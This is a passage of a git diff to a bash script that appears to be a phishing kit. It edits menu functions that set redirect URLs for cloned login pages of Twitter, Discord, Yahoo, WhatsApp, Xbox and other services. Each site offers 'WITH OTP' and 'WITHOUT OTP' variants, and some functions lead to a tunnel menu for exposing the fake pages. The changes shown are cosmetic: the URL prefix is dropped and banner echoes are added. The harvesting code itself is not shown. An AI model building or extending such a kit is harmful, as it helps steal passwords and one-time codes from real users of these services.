+rdurl="www.twitch.tv/"
 echo -e "${BLUE}[01]${CYAN} Twitch - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Twitch - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Twitch New - WITHOUT OTP ${NC}"
@@ -2302,7 +2480,12 @@ esac
 #twitter
 site_twitter(){
 siname="Twitter"
-rdurl="https://twitter.com"
+rdurl="twitter.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2323,7 +2506,12 @@ esac
 #ubereats
 site_ubereats(){
 siname="ubereats"
-rdurl="https://www.ubereats.com/"
+rdurl="www.ubereats.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2344,7 +2532,12 @@ esac
 #verizon
 site_verizon(){
 siname="Verizon"
-rdurl="https://www.verizon.com/"
+rdurl="www.verizon.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2365,14 +2558,19 @@ esac
 #visim
 site_visim(){
 website="visim"
-rdurl="https://www.myvi.in/"
+rdurl="www.myvi.in/"
 siname="VI sim"
 tunnelmenu
 }
 #vk
 site_vk(){
 siname="VK"
-rdurl="https://vk.com"
+rdurl="vk.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} VK - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} VK - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} VK poll - WITHOUT OTP ${NC}"
@@ -2397,14 +2595,19 @@ esac
 #whatsapp
 site_whatsapp(){
 website="whatsapp"
-rdurl="https://www.web.whatsapp.com"
+rdurl="www.web.whatsapp.com"
 siname="WhatsApp"
 tunnelmenu
 }
 #wordpress
 site_wordpress(){
 siname="Wordpress"
-rdurl="https://wordpress.com/"
+rdurl="wordpress.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2425,7 +2628,12 @@ esac
 #xbox
 site_xbox(){
 siname="Xbox"
-rdurl="https://www.xbox.com"
+rdurl="www.xbox.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2446,7 +2654,12 @@ esac
 #yahoo
 site_yahoo(){
 siname="Yahoo"
-rdurl="https://yahoo.com"
+rdurl="yahoo.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2467,7 +2680,12 @@ esac
 #yandex
 site_yandex(){
 siname="Yandex"
-rdurl="https://yandex.com/"
+rdurl="yandex.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2488,7 +2706,12 @@ esac
 #ytsubs
 site_ytsubs(){
 siname="YT subs"
-rdurl="https://www.youtube.com"
+rdurl="www.youtube.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2510,7 +2733,12 @@ esac
 #discord
 site_discord(){
 siname="Discord"
-rdurl="https://www.discord.com"
+rdurl="www.discord.com"
+{ clear; banner; echo "/n"; }
+echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} SITE : ${MAGENTA}${siname}"
+echo "\n"
+echo "\n${RED}[${WHITE}-${RED}]${GREEN} Chooose a choice"
+echo "\n"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2531,7 +2759,7 @@ esac
 #jiorouter
 site_jiorouter(){
 siname="Jio Router"
-rdurl="https://www.jio.com/business/jiofi"
+rdurl="www.jio.com/business/jiofi"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
@@ -2552,7 +2780,7 @@ esac
 #googlewifi
 site_googlewifi(){
 website="googlewifi"
-rdurl="https://fiber.google.com/wifi/"
+rdurl="fiber.google.com/wifi/"
 siname="Google WIFI"
 tunnelmenu
 }
